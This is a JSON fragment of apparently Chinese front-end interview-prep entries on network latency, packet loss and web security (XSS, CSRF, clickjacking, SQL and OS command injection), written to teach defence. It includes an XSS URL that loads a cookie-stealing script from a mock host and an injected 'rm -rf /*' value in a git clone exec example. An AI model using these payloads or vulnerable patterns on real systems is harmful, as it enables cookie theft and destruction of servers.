    "explanation": "### 1、什么是延迟呢？\n\n延迟其实就是我们在网页浏览或者使用应用时，从我们点击请求到服务器返回结果给我们之间的时间差。就像你在跟朋友打电话，你说完话后，朋友听到并回应你所说话的时间差一样。\n\n我们的最终目标是创建一个系统，让这个时间差变得尽可能短，也就是实现零延迟。但现实世界中，有各种各样的问题会导致系统出现延迟。如果系统的延迟很低，那么我们请求得到响应的时间就会很短。每次你在浏览器中输入网址或者点击一个链接，浏览器都会向服务器发出一个请求信号，然后服务器需要处理这个请求，获取需要的信息，最后把这些信息返回给你的浏览器。整个过程中就会有一些时间差，这就是延迟。所以，我们要不断努力降低延迟，提高系统的响应速度。\n\n![](https://static.ecool.fun//article/7cf044f5-1b24-4fa8-a68e-ff97819b2eae.)\n\n### 2、延迟是怎么回事呢？\n\n延迟其实就是你在请求后需要等待的时间，就像等待快递送到家门一样。来看个例子，更容易理解它是怎么运作的。\n\n想象你正在和一个电子商务网站（比如淘宝）互动，你喜欢一个商品，然后把它加入购物车。现在，当你点击“添加到购物车”按钮时，下面的事情会依次发生：\n\n1. 你点击了“添加到购物车”按钮，这时就像你启动了一个计时器，浏览器开始向服务器发请求。\n2. 服务器收到请求，然后开始处理它，就像你的快递订单到了快递中心一样。\n3. 服务器处理完后，回应你的请求，信息到达你的浏览器，商品成功添加到购物车中，就像你的包裹送到了家门口一样。\n\n你可以想象在第一步按下了计时器的启动按钮，然后在最后一步停下，这段时间就是延迟。希望这个例子能让你更容易理解延迟是如何运作的。\n\n![](https://static.ecool.fun//article/e5910d4d-fb61-4fc9-a92a-3ff9258a30ec.)\n\n### 3、延迟都是怎么来的呢？\n\n现在，你应该已经理解了要点，但是你知道是什么造成了延迟吗？网络中的延迟受多种因素影响，它们在确定延迟的具体数值时扮演着关键角色。其中一个主要因素是出站呼叫。回到之前添加购物车的例子，当你点击浏览器上的按钮时，请求会发送到后端的某个服务器，这个服务器可能会在内部调用多个服务来进行计算（可能是同时或者按顺序），然后等待它们的响应或将它们汇总。所有这些因素都会增加呼叫的延迟。但总结起来，主要由以下几个因素引起：\n\n1. **传输介质：** 传输介质指的是信息在起点和终点之间的物理路径。系统的延迟会取决于用于传输请求的介质类型。广域网、光纤电缆等传输介质都广泛应用，但每种介质都有自己的限制，这会影响延迟。\n2. **传播延迟：** 这指的是数据包从一个源传播到另一个源所需的时间。系统的延迟很大程度上取决于通信节点之间的距离。节点距离越远，系统的延迟就会越高。\n3. **路由器：** 路由器在通信中扮演着重要的角色，它们需要一些时间来分析数据包的标头信息。延迟取决于路由器处理请求的效率。每一次路由器到路由器的跳跃都会增加系统的延迟。\n4. **存储延迟：** 系统的延迟还受到所使用的存储系统类型的影响，因为处理和返回数据可能需要一些时间。因此，访问存储中的数据会增加系统的延迟。\n\n### 4、如何测量延迟？\n\n要量化延迟其实很简单，我们有几种常用的方法，让我们来看看最常见的三种：\n\n1. **Ping（网络探测）：** Ping是测量延迟最常用的工具之一。它的原理是向目标地址发送一个小数据包，然后查看接收到响应所需的时间。更快的Ping意味着连接更敏捷，响应更迅速。\n\n![](https://static.ecool.fun//article/2ac20910-b0f0-4ce2-b49f-aa22a1455f3a.)\n\n1. **Traceroute（路径跟踪）：** Traceroute是另一个用于测试延迟的工具。它也使用数据包，但不止如此，它还会逐一记录数据包从源到目的地经过的每个中间节点所需的时间。这有助于识别网络中的延迟点。\n2. **MTR（网络诊断工具）：** MTR是Ping和Traceroute的超级组合。MTR提供了详尽的报告，列出了从一个端点到另一个端点所需的每个网络节点的信息。这份报告通常包括了各种细节，比如丢包率、平均延迟等，非常有助于分析网络性能。\n\n### 5、延迟优化\n\n延迟是系统性能的绊脚石，所以我们需要采取一些措施来进行优化。下面是一些简单又实用的方法，可以帮助我们减少延迟：\n\n1. **采用HTTP/2：** 使用HTTP/2协议可以显著减少延迟。它支持并行传输，最大程度地减少了数据从发送方到接收方的往返次数，这对于降低延迟非常有效。\n2. **减少外部HTTP请求：** 第三方服务会增加延迟。通过减少外部HTTP请求的数量，我们可以提高系统的响应速度和质量。\n3. **使用CDN：** 内容分发网络（CDN）被证明能够减少延迟。CDN会在全球多个位置缓存资源，从而减少请求和响应的传输时间。这意味着可以从更接近客户端的缓存位置获取请求，而不必每次都回到原始服务器。\n\n![](https://static.ecool.fun//article/adf4a638-6133-4b92-95fd-c4f83c768b66.)\n\n1. **浏览器缓存：** 利用浏览器缓存，可以减少向服务器发送的请求次数，从而降低延迟。浏览器会在本地缓存特定资源，这对于提高页面加载速度很有帮助。\n2. **优化磁盘I/O：** 为了减小磁盘I/O的影响，我们需要优化算法，尽量减少频繁的磁盘写入操作。可以考虑使用直写式缓存、内存数据库，或者在适当的情况下进行写入合并，还可以考虑使用快速存储系统，比如SSD。\n\n作为开发人员，我们还可以在应用程序级别采取一些方法来优化延迟：\n\n* **避免低效算法：** 高效的算法是代码中延迟的主要来源之一。要尽量避免不必要的循环或昂贵的嵌套操作。\n* **避免锁定的设计模式：** 锁定会引入延迟，因此我们应该采用避免锁定的设计模式，特别是在多线程环境中。\n* **采用异步编程模型：** 异步编程可以更好地利用硬件资源，因为它避免了阻塞操作，从而减少等待时间。\n* **限制无界队列深度：** 限制无界队列深度并提供反压通常可以减少代码中的等待时间，从而产生更可预测的延迟。\n\n这些方法可以帮助我们优化延迟，提高系统性能，让用户获得更好的体验。",
    "testPoint": "在前端面试中，**网络延迟和丢包**是评估你对网络传输、性能瓶颈及应对策略理解的重要考点。面试官会通过这些话题判断能否从**网络层面**分析问题、优化用户体验，特别是在弱网环境、移动端场景下。\n\n## 一、网络延迟的考点\n\n### 1. 网络延迟的构成\n\n面试官可能会问：“用户输入 URL 后，请求延迟可能发生在哪些阶段？”\n\n| 阶段         | 含义             |\n| ---------- | -------------- |\n| DNS 解析     | 域名 → IP 地址     |\n| TCP 建立连接   | 三次握手耗时         |\n| TLS 握手     | HTTPS 建立安全连接耗时 |\n| 请求发送       | 客户端发送数据        |\n| 首字节返回 TTFB | 服务端处理 + 网络传输   |\n| 内容下载       | 响应内容下载耗时       |\n| 渲染耗时       | 浏览器解析和绘制页面     |\n\n### 2. 常见影响网络延迟的因素\n\n* 地域距离：客户端与服务端物理距离大（如中国访问美国服务器）\n* DNS 缓存未命中或 DNS 配置不合理\n* TLS 握手过长（HTTPS 开销）\n* 带宽瓶颈：文件过大、网络拥堵\n* 长连接未复用（未启用 HTTP/2）\n* 移动网络抖动高（4G/5G 网络波动）\n* 首包延迟（TTFB 过高）\n\n### 3. 如何优化延迟？\n\n* 启用 CDN，部署全球节点，减少 RTT\n* 启用 DNS 预解析：`<link rel=\"dns-prefetch\">`\n* 启用 HTTP/2 或 HTTP/3，减少连接耗时\n* 减少重定向跳转、合并请求\n* 使用 `preconnect`、`prefetch` 提前连接目标源\n* SSR 提前输出首屏 HTML，减少白屏\n* 缓存优化（减少服务端响应压力）\n\n\n## 二、丢包的考点\n\n### 1. 丢包的本质\n\n网络传输中，部分数据包因**链路拥堵、信号弱、硬件丢包率高**等原因，未能到达目的地。\n\n**TCP**：自动重传（影响性能）\n**UDP**：直接丢弃（不保证可靠）\n\n### 2. 丢包导致的问题\n\n* **加载失败**：资源文件加载中断（如 JS/CSS/图片）\n* **响应延迟**：TCP 重传机制 → 等待时间增加\n* **交互卡顿**：重要请求（如接口）多次丢失\n* **视频/音频卡顿**：UDP 传输音视频，丢包率影响体验\n\n\n### 3. 如何应对丢包？\n\n* **使用 HTTP/3（QUIC）**：基于 UDP，内建重传 + 多路复用，丢包影响小\n* **合理设置超时重试机制**：接口请求失败时自动重试\n* **请求兜底策略**：核心数据失败后提示用户或降级\n* **断点续传/Range 请求**：大文件支持分段传输\n* **服务端压缩**：减少包体积，降低丢包概率\n* **尽量使用 CDN**：就近分发，避免跨境链路\n\n\n## 三、典型面试问题示例\n\n| 问题                  | 涉及知识点                                |\n| ------------------- | ------------------------------------ |\n| TTFB 高可能有哪些原因？      | DNS 慢、服务器响应慢、TLS 握手慢                 |\n| 如何应对弱网环境下的资源丢包？     | 重试机制、HTTP/3、断点续传                     |\n| TCP 丢包和 UDP 丢包的区别？  | TCP 重传保证可靠性，UDP 丢就丢了                 |\n| 为什么 HTTP/3 更适合移动端？  | 快速建连、UDP、丢包影响小                       |\n| 如果某请求丢包导致加载卡顿，怎么定位？ | DevTools 网络请求状态、失败重试、ping/traceroute |\n\n## 四、总结表格\n\n| 项目    | 网络延迟                            | 丢包                      |\n| ----- | ------------------------------- | ----------------------- |\n| 本质    | 请求往返耗时（RTT）                     | 网络数据包未能到达               |\n| 表现    | 页面加载慢、白屏、交互延迟                   | 请求失败、加载中断、视频卡顿          |\n| 影响范围  | 所有请求均可能影响                       | 重要资源或关键请求影响更明显          |\n| 优化方式  | CDN、预连接、HTTP/2、请求合并等            | QUIC 协议、请求重试、兜底机制       |\n| 与协议关系 | TCP/UDP 均有延迟                    | TCP 可重传，UDP 丢包不可恢复      |\n| 工具定位  | Chrome DevTools、ping、traceroute | DevTools 网络失败、Wireshark |\n",
    "exerciseKeyList": "[\"919d2e94-71b1-4096-b263-4a1edb0231be\",\"72450c25-d5a3-4dbb-b86e-ff7cb02a4ec2\",\"cef2e473-d9d3-4c2e-937d-9ffe268aeda7\"]",
    "vipLimit": 1,
    "level": 3,
    "pointOrder": 1,
    "createAt": "2025-07-28T06:50:03.000Z",
    "updateAt": "2025-08-06T03:36:32.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "72450c25-d5a3-4dbb-b86e-ff7cb02a4ec2",
        "title": "TCP 和 UDP的区别是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-08-23T06:26:40.000Z",
        "updateAt": "2024-08-10T17:05:45.000Z"
      },
      {
        "exerciseKey": "919d2e94-71b1-4096-b263-4a1edb0231be",
        "title": "TCP是怎么判断丢包的？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-04-20T04:26:00.000Z",
        "updateAt": "2024-08-10T17:06:33.000Z"
      },
      {
        "exerciseKey": "cef2e473-d9d3-4c2e-937d-9ffe268aeda7",
        "title": "TCP链接为什么会采用三次握手，而不是两次或者四次呢？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T07:16:01.000Z",
        "updateAt": "2024-08-10T17:04:53.000Z"
      }
    ]
  },
  "246": {
    "id": 246,
    "tagId": 16,
    "title": "网络安全",
    "explanation": "## 1、XSS\n\n> Cross Site Scripting 又叫做跨站脚本攻击,本身应该叫做CSS,但是由于CSS被占用,无奈下叫做XSS\n\n### what is XSS?\n\n我们先从字面意义上看一下,跨站->顾名思义就是我们从一个网站跑到了另外一个网站上,脚本->也就是我们往页面中写了脚本内容,可以理解为写了js代码,那么最后我们对网站造成了攻击。就是攻击者想尽一切办法将可以执行的代码注入到网页中。\n\n例如: 我们在登录了一个网站之后,一般都会把登录状态保存在cookie中,当我们去访问另外一个网站的时候,就会读取到cookie\n\n### XSS危害\n\n```\n1、利⽤虚假输⼊表单骗取⽤户个⼈信息。\n2、利⽤脚本窃取⽤户的Cookie值，被害者在不知情的情况下，帮助攻击者发送恶意请求。\n3、显示伪造的⽂章或图⽚。\n```\n\n### 简单演示\n\n```\n// 普通\nhttp://localhost:3000/?from=china\n// alert尝试\nhttp://localhost:3000/?from=<script>alert(3)</script>\n// 如果可以弹出3,证明这个输入框没有过滤html标记\n\n```\n\n模拟获取cookie\n\n```\nhttp://localhost:3000/?from=<script src=\"http://localhost:4000/hack.js\">\n```\n\n后台代码\n\n```js\nconst koa = require('koa');  // 启动在4000端口上\nconst chalk = require('chalk')\nconst log = contents => {\n    console.log(chalk.red(contents)) //打印cookie\n}\n\n// 模拟黑客网站\nconst app = new koa();\n\nmodule.exports = app\n```\n\n### 存储型（server端）：\n\n> 场景：见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。\n\n攻击步骤：\n\n```\n1、攻击者将恶意代码提交到目标网站的数据库中\n2、用户打开目标网站时，服务端将恶意代码从数据库中取出来，拼接在HTML中返回给浏览器\n3、用户浏览器在收到响应后解析执行，混在其中的恶意代码也同时被执行\n4、恶意代码窃取用户数据，并发送到指定攻击者的网站，或者冒充用户行为，调用目标网站的接口，执行恶意操作\n```\n\n### 反射型（Server端）\n\n> 与存储型的区别在于，存储型的恶意代码存储在数据库中，反射型的恶意代码在URL上\n\n> 场景：通过 URL 传递参数的功能，如网站搜索、跳转等。\n\n攻击步骤：\n\n```\n1、攻击者构造出特殊的 URL，其中包含恶意代码。\n2、用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。\n3、用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。\n4、恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。\n```\n\n### Dom 型(浏览器端）\n\n> DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。\n\n> 场景：通过 URL 传递参数的功能，如网站搜索、跳转等。\n\n攻击步骤：\n\n```\n1、攻击者构造出特殊的 URL，其中包含恶意代码。\n2、用户打开带有恶意代码的 URL。\n3、用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。\n4、恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。\n```\n\n### 防御措施\n\n> 防止攻击者提交恶意代码，防止浏览器执行恶意代码\n\n1、设置HEAD\n\n```\nctx.set('X-XSS-Protection', 0) // 禁⽌XSS过滤\n```\n\n2、设置HttpOnly Cookie\n\n这是预防XSS攻击窃取⽤户cookie最有效的防御⼿段。Web应 ⽤程序在设置cookie时，将其属性设为HttpOnly，就可以避免该⽹⻚的cookie被客户端恶意JavaScript窃取，保护⽤户cookie信息。\n\n```\nresponse.addHeader(\"Set-Cookie\", \"uid=112; Path=/; HttpOnly\")\n```\n\n3、CSP\n\n内容安全策略 (CSP, Content Security Policy) 是⼀个附加的安全层，⽤于帮助检测和缓解某些类型的攻击，包括跨站脚本 (XSS) 和数据注⼊等攻击。 这些攻击可⽤于实现从数据窃取到⽹站破坏或作为恶意软件分发版本等⽤途。\n\nCSP 本质上就是建⽴⽩名单，由浏览器进行拦截。开发者明确告诉浏览器哪些外部资源可以加载和执⾏。我们只需要配置规则，如何拦截是由浏览器⾃⼰实现的。我们可以通过这种⽅式来尽量减少\nXSS 攻击。\n\n* Content-Security-Policy: default-src 'self' -所有内容均来自站点的同一个源（不包括其子域名）\n* Content-Security-Policy: default-src 'self' \\*.trusted.com-允许内容来自信任的域名及其子域名 (域名不必须与CSP设置所在的域名相同)\n* Content-Security-Policy: default-src xxxx.com - 该服务器仅允许通过HTTPS方式并仅从xxxx.com域名来访问文档\n\n4、对数据进行严格的输出编码：如HTML元素的编码，JS编码，CSS编码，URL编码等等\n\n```\n1、避免拼接 HTML；\n2、Vue/React 技术栈，避免使用 v-html / dangerouslySetInnerHTML\n```\n\n5、输入验证：比如一些常见的数字、URL、电话号码、邮箱地址等等做校验判断\n\n6、验证码\n\n## 2、CSRF\n\n> CSRF(Cross Site Request Forgery)，即跨站请求伪造，是⼀种常⻅的Web攻击，它利⽤⽤户已登录的身份，在⽤户毫不知情的情况下，以⽤户的名义完成⾮法操作\n\n### what is CSRF?\n\n还是从字面上去分析,跨站还是指从一个网站指向另外一个网站,于XSS不同的是,他是请求,指我们在别的网站上发出一个请求,而这个请求是伪造出来的\n\n⽤户已经登录了站点 A，并在本地记录了 cookie\n\n在⽤户没有登出站点 A 的情况下（也就是 cookie ⽣效的情况下），访问了恶意攻击者提供的引诱危险站点 B (B 站点要求访问站点A)。\n\n站点 A 没有做任何 CSRF 防御\n\n攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。\n\n### 攻击流程举例\n\n```\n1、受害者登录 a.com，并保留了登录凭证（Cookie）\n2、攻击者引诱受害者访问了b.com\n3、b.com 向 a.com 发送了一个请求：a.com/act=xx浏览器会默认携带a.com的Cookie\n4、a.com接收到请求后，对请求进行验证，并确认是受害者的凭证，误以为是受害者自己发送的请求\n5、a.com以受害者的名义执行了act=xx\n6、攻击完成，攻击者在受害者不知情的情况下，冒充受害者，让a.com执行了自己定义的操作\n```\n\n### 攻击类型\n\n```\n1、ET型：如在页面的某个 img 中发起一个 get 请求\n2、POST型：通过自动提交表单到恶意网站\n3、链接型：需要诱导用户点击链接\n```\n\n### CSRF危害\n\n```\n* 利⽤⽤户登录状态\n* ⽤户不知情\n* 完成业务请求\n* 盗取⽤户资⾦（转账，消费）\n* 冒充⽤户发帖背锅\n* 损害⽹站声誉\n```\n\n### 防御CSRF\n\nCSRF通常从第三方网站发起，被攻击的网站无法防止攻击发生，只能通过增强自己网站针对CSRF的防护能力来提升安全性。\n\n```\n1、禁⽌第三⽅⽹站带Cookie - 有兼容性问题\n\nSamesite Cookie属性：\n\nGoogle起草了一份草案来改进HTTP协议，那就是为Set-Cookie响应头新增Samesite属性\n\n它用来标明这个 Cookie是个“同站 Cookie”，同站Cookie只能作为第一方Cookie，不能作为第三方Cookie\n\nSamesite 有两个属性值，Strict 为任何情况下都不可以作为第三方 Cookie ，Lax 为可以作为第三方 Cookie，但必须是Get请求\n\n2、Referer Check - Https不发送referer\n\n3、验证码\n\n4、同源检测：通过Header中的Origin Header 、Referer Header 确定，但不同浏览器可能会有不一样的实现，不能完全保证\n\n5、CSRF Token 校验：将CSRF Token输出到页面中（通常保存在Session中），页面提交的请求携带这个Token，服务器验证Token是否正确\n\n6、双重cookie验证：\n\n流程：\n\n步骤1：在用户访问网站页面时，向请求域名注入一个Cookie，内容为随机字符串（例如csrfcookie=v8g9e4ksfhw）\n\n步骤2：在前端向后端发起请求时，取出Cookie，并添加到URL的参数中（接上例POST https://www.a.com/comment?csrfcookie=v8g9e4ksfhw）\n\n步骤3：后端接口验证Cookie中的字段与URL参数中的字段是否一致，不一致则拒绝。\n\n优点：\n\n1）、无需使用Session，适用面更广，易于实施。\n\n2）、Token储存于客户端中，不会给服务器带来压力。\n\n3）、相对于Token，实施成本更低，可以在前后端统一拦截校验，而不需要一个个接口和页面添加。\n\n缺点：\n\n1）、Cookie中增加了额外的字段。\n\n2）、如果有其他漏洞（例如XSS），攻击者可以注入Cookie，那么该防御方式失效。\n\n3）、难以做到子域名的隔离。\n\n4）、为了确保Cookie传输安全，采用这种防御方式的最好确保用整站HTTPS的方式，如果还没切HTTPS的使用这种方式也会有风险。\n\n```\n\n## 3、iframe 安全\n\n### what is iframe劫持?\n\n```\n1、嵌入第三方 iframe 会有很多不可控的问题，同时当第三方 iframe 出现问题或是被劫持之后，也会诱发安全性问题\n\n2、点击劫持\n\n点击劫持是⼀种视觉欺骗的攻击⼿段。\n\n攻击者将需要攻击的⽹站通过iframe嵌套的⽅式嵌⼊⾃⼰的⽹⻚中，并将 iframe 设置为透明，在⻚⾯中透出⼀个按钮诱导⽤户点击。\n\n3、禁止自己的 iframe 中的链接外部网站的JS\n\n```\n\n### 预防方案：\n\n```\n1、为 iframe 设置 sandbox 属性，通过它可以对iframe的行为进行各种限制，充分实现“最小权限“原则\n\n2、服务端设置 X-Frame-Options Header头，拒绝页面被嵌套，X-Frame-Options 是HTTP 响应头中用来告诉浏览器一个页面是否可以嵌入 <iframe> 中\neg.X-Frame-Options: SAMEORIGIN\nSAMEORIGIN: iframe 页面的地址只能为同源域名下的页面\nALLOW-FROM: 可以嵌套在指定来源的 iframe 里\nDENY: 当前页面不能被嵌套在 iframe 里\n\n3、设置 CSP 即 Content-Security-Policy 请求头\n\n4、减少对 iframe 的使用\n\n```\n\n```\nctx.set('X-FRAME-OPTIONS', 'DENY')\n\n```\n\nJS方式\n\n```\n<head>\n    <style id=\"click-jack\">\n    html {\n        display: none !important;\n    }\n    </style>\n</head>\n<body>\n    <script>\n    if (self == top) {\n        var style = document.getElementById('click-jack')\n        document.body.removeChild(style)\n    } else {\n        top.location = self.location\n    }\n    </script>\n</body>\n\n```\n\n## 4、SQL 注入\n\n> sql是我们学习数据库的一种语言,而注入就代表是从前端对数据库下手\n\n### what is sql注入?\n\n就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗数据库服务器执行恶意的SQL命令,从而达到和服务器\n进行直接的交互\n\n### 防御措施\n\n其实防御起来很简单,每个语言都提供了不同的方式,但是原理就是***不进行字符串拼接,而是用占位符***\n\n```\n1、严格限制Web应⽤的数据库的操作权限**，给此⽤户提供仅仅能够满⾜其⼯作的最低权限，从⽽最⼤限度的减少注⼊攻击对数据库的危害\n\n2、对进⼊数据库的特殊字符（'，\"，\\，<，>，&，*，; 等）进⾏转义处理，或编码转换**。基本上所有的后端语⾔都有对字符串进⾏转义处理的⽅法，⽐如 lodash 的 lodash._escapehtmlchar库。\n\n3、后端代码检查输⼊的数据是否符合预期**，严格限制变量的类型，例如使⽤正则表达式进⾏⼀些匹配处理。\n\n```\n\n---\n\n接下来这几个我们也做个了解：\n\n## 5、OS命令注⼊\n\n> OS命令注⼊和SQL注⼊差不多，只不过SQL注⼊是针对数据库的，⽽OS命令注⼊是针对操作系统的。OS命令注⼊攻击指通过Web应⽤，执⾏⾮法的操作系统命令达到攻击的⽬的。只要在能调⽤Shell函数的地⽅就有存在被攻击的⻛险。倘若调⽤Shell时存在疏漏，就可以执⾏插⼊的⾮法命令。\n\n```\n// 以 Node.js 为例，假如在接⼝中需要从 github 下载⽤户指定的 repo\nconst exec = require('mz/child_process').exec;\nlet params = {/* ⽤户输⼊的参数 */};\nexec(`git clone ${params.repo} /some/path`);\n\n```\n\n如果参数是\n\n```\nhttps://github.com/xx/xx.git && rm -rf /* &&\n\n```\n\n注意:一旦你执行了上述“rm -rf /” 或者“rm -rf /\\*”命令,会删除Linux根目录下的所有文件,直接导致服务器瘫痪\n\n## 6、请求劫持\n\nDNS劫持\n\n> 顾名思义，DNS服务器(DNS解析各个步骤)被篡改，修改了域名解析的结果，使得访问到的不是预期的ip\n\nHTTP劫持 运营商劫持，此时⼤概只能升级HTTPS了\n\n## 7、DDOS\n\n> distributed denial of service 分布式系统攻击\n\n### what is DDOS?\n\nDDOS 不是⼀种攻击，⽽是⼀⼤类攻击的总称。它有⼏⼗种类型，新的攻击⽅法还在不断发明出来。⽹站运⾏的各个环节，都可以是攻击⽬标。只要把⼀个环节攻破，使得整个流程跑不起来，就达到了瘫痪服务的⽬的。\n\n其中，⽐较常⻅的⼀种攻击是 cc 攻击。它就是简单粗暴地送来⼤量正常的请求，超出服务器的最⼤承受量，导致宕机。我遭遇的就是 cc 攻击，最多的时候全世界⼤概20多个 IP 地址轮流发出请求，每个地址的请求量在每秒200次~300次。我看访问⽇志的时候，就觉得那些请求像洪⽔⼀样涌来，⼀眨眼就是⼀⼤堆，⼏分钟的时间，⽇志⽂件的体积就⼤了100MB。说实话，这只能算⼩攻击，但是我的个⼈⽹站没有任何防护，服务器还是跟其他⼈共享的，这种流量⼀来⽴刻就下线了。\n\n### 如何防御\n\n说白了花钱解决,哈哈...\n\n总结：其实还有其它安全的问题，本文就帮助大家大致了解这一部分。前四个希望大家都理解记忆，也是我们常遇到的，项目中也是需要我们处理的。后边的几个可以了解为主，有能力者可以做更多的扩展。本文是有些是个人拙见，如有意见或见解，可以留言共同探讨。\n",
    "testPoint": "“网络安全”是前端面试中非常重要的一部分，特别是高级前端岗位，会关注你是否具备**安全意识、常见攻击理解、防御能力**和**在工程实践中落地的经验**。\n\n## 一、常见网络安全威胁及考察点\n\n### 1. **XSS（跨站脚本攻击）**\n\n**含义**：攻击者在网页中注入恶意脚本，让浏览器执行。\n\n**考察点**：\n\n* XSS 的类型（反射型、存储型、DOM 型）\n* 攻击入口：表单、URL、DOM 插值、富文本\n* 防范措施：\n\n  * 输出内容做转义（如 HTML Entity）\n  * 使用 CSP（内容安全策略）\n  * 禁止 `innerHTML`，使用安全 API（如 `textContent`）\n  * 使用第三方库（如 DOMPurify）做富文本清洗\n  * HttpOnly 防止读取 Cookie\n\n---\n\n### 2. **CSRF（跨站请求伪造）**\n\n**含义**：诱导用户点击链接，对目标站点发起操作请求。\n\n**考察点**：\n\n* 原理：利用浏览器自动携带 Cookie 发起请求\n* 攻击方式：诱导点击、图片加载等隐式提交\n* 防范措施：\n\n  * 使用 Token 验证（CSRF Token）\n  * 检查 `Referer` 或 `Origin` 头\n  * 请求接口限定为 POST，并校验内容\n  * SameSite Cookie 属性配置\n\n---\n\n### 3. **点击劫持（Clickjacking）**\n\n**含义**：攻击者在自己的页面上嵌套目标站，诱导用户点击。\n\n**考察点**：\n\n* 利用 iframe 蒙版 + 透明操作实现诱导点击\n* 防范方式：\n\n  * 使用 `X-Frame-Options: DENY` / `SAMEORIGIN`\n  * 使用 `Content-Security-Policy: frame-ancestors` 控制嵌套来源\n  * 页面内 JS 检测 `window.top !== window.self` 防 iframe 嵌套\n\n---\n\n### 4. **中间人攻击（MITM）**\n\n**含义**：攻击者截取用户和服务端之间的数据通信内容。\n\n**考察点**：\n\n* 防御方式：\n\n  * 使用 HTTPS 加密数据传输\n  * 启用 HSTS，防止降级攻击\n  * 证书校验、防止证书伪造\n\n---\n\n### 5. **内容安全策略（CSP）**\n\n**含义**：通过响应头限制页面加载资源的来源，防止 XSS、数据劫持等。\n\n**考察点**：\n\n* 基本语法：\n\n  ```http\n  Content-Security-Policy: default-src 'self'; script-src 'self' cdn.com;\n  ```\n* 如何配置 CSP 白名单\n* 影响第三方脚本、图片等内容的加载\n\n---\n\n### 6. **Cookie 安全**\n\n**考察点**：\n\n* Cookie 属性的安全配置：\n\n  * `Secure`: 仅通过 HTTPS 传输\n  * `HttpOnly`: JS 无法访问（防止 XSS 窃取）\n  * `SameSite`：限制跨站携带行为\n* Cookie 泄露的常见途径\n\n---\n\n### 7. **前端加密相关**\n\n**考察点**：\n\n* 前端是否能做加密？是否安全？\n* 加密算法类型（Base64 ≠ 加密、MD5/SHA 加密不可逆）\n* 前端加密常用于数据混淆，但不能代替后端校验\n\n---\n\n### 8. **CORS（跨域资源共享）**\n\n**考察点**：\n\n* 为什么浏览器会限制跨域？（同源策略）\n* `Access-Control-Allow-Origin` 的配置方式\n* `withCredentials`、预检请求、OPTIONS 请求\n* CORS 不能防 CSRF，需额外防护\n\n---\n\n### 9. **开放接口与 API 安全**\n\n**考察点**：\n\n* 接口权限控制（不同用户是否能访问同一数据）\n* 是否存在越权访问、参数篡改问题\n* 接口是否存在 IDOR（不安全的直接对象引用）\n\n---\n\n### 10. **第三方脚本注入与依赖风险**\n\n**考察点**：\n\n* 引入第三方脚本的安全性\n* `Subresource Integrity (SRI)`：校验 CDN 脚本完整性\n* 软件供应链攻击（npm 依赖被污染）\n* 如何使用 Snyk、npm audit 等工具进行依赖漏洞扫描\n\n---\n\n## 二、工程实践类考点\n\n* 如何在项目中防止 XSS？\n* 如何设计一个安全的文件上传功能？\n* 如何在前端设计登录/鉴权流程？\n* Token（如 JWT）的安全性、存储方式（localStorage vs Cookie）\n* 你在实际项目中做过哪些安全加固处理？\n\n---\n\n## 三、常见面试问题示例\n\n| 题目                   | 涉及知识点                   |\n| -------------------- | ----------------------- |\n| 什么是 XSS？如何防范？        | 输出转义、CSP、防 innerHTML    |\n| CSRF 如何攻击？如何防御？      | Token、防跨域请求、SameSite    |\n| HTTPS 如何保障通信安全？      | 加密、证书验证、MITM 防护         |\n| 浏览器的同源策略限制了哪些行为？     | 跨域限制、Cookie 访问          |\n| JWT Token 应该放在哪？为什么？ | localStorage/Cookie 的对比 |\n| 如何防止 iframe 加载你的页面？  | X-Frame-Options、CSP     |\n| 前端加密能防止数据泄露吗？        | 加密 ≠ 安全，关键验证需后端完成       |\n\n---\n\n## 四、总结表格：前端网络安全考点总览\n\n| 安全方向         | 关键点                                       |\n| ------------ | ----------------------------------------- |\n| XSS          | 输入校验、输出转义、CSP、富文本清洗                       |\n| CSRF         | Token 验证、Referer 检查、SameSite Cookie       |\n| Clickjacking | `X-Frame-Options`、CSP 的 `frame-ancestors` |\n| 中间人攻击        | 强制 HTTPS、证书验证、HSTS                        |\n| Cookie 安全    | HttpOnly、Secure、SameSite                  |\n| 加密与鉴权        | JWT 安全、Token 存储策略、数据加密混淆                  |\n| 第三方脚本        | SRI 校验、CDN 可信来源、依赖审计                      |\n| 文件上传         | 类型校验、后端验证、URL 白名单、重命名、隔离存储                |\n| 接口权限         | 数据权限校验、操作权限、IDOR 检查                       |\n| CORS 与同源策略   | 请求限制、预检请求、响应头配置                           |",
    "exerciseKeyList": "[\"f1de93ec-d1c8-48b0-98a9-bf256dfe2df0\"]",
    "vipLimit": 1,
    "level": 2.5,
    "pointOrder": 1,
    "createAt": "2025-07-28T07:01:52.000Z",
    "updateAt": "2025-08-06T02:48:38.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "f1de93ec-d1c8-48b0-98a9-bf256dfe2df0",
        "title": "前端的常规安全策略",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T11:03:43.000Z",
        "updateAt": "2024-07-18T23:19:13.000Z"
      }
    ]
  },
  "247": {
    "id": 247,
    "tagId": 16,
    "title": "http2.0/http3.0",
